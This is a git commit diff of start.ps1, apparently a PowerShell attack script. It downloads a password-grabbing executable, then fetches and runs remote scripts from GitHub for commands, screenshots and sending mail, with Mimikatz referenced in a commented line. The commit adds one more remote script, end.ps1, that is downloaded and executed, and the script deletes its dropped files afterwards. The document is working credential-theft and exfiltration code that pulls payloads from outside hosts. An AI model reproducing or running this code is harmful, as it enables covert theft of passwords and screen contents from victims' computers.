b51965fdbf42ec1e8e90ae373852a40340a555ac
pc gou <pc gou>
2016-06-05 18:58:50 +0800

    add function

--- start.ps1
+++ start.ps1
@@ -3,12 +3,15 @@ $command = "https://raw.githubusercontent.com/gpengc/powershell/master/command.b
 $mimikatz = "https://raw.githubusercontent.com/gpengc/powershell2/master/Invoke-Mimikatz.ps1"
 $screenshot = "https://raw.githubusercontent.com/gpengc/powershell2/master/Take-ScreenShot.ps1"
 $sendmail = "https://raw.githubusercontent.com/gpengc/powershell2/master/send-mail.ps1"
+$end="https://github.com/gpengc/powershell2/raw/master/end.ps1"
 
 (new-object net.webclient).downloadfile($getpass,"e:\getpass.exe")
 iex((new-object net.webclient).downloadstring($command))
 #(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
 iex((new-object net.webclient).downloadstring($screenshot))
 iex((new-object net.webclient).downloadstring($sendmail))
+sleep -s 5
+iex((new-object net.webclient).downloadstring($end))
 #sleep -s 5
 rm e:\getpass.*
 rm e:\screen.png
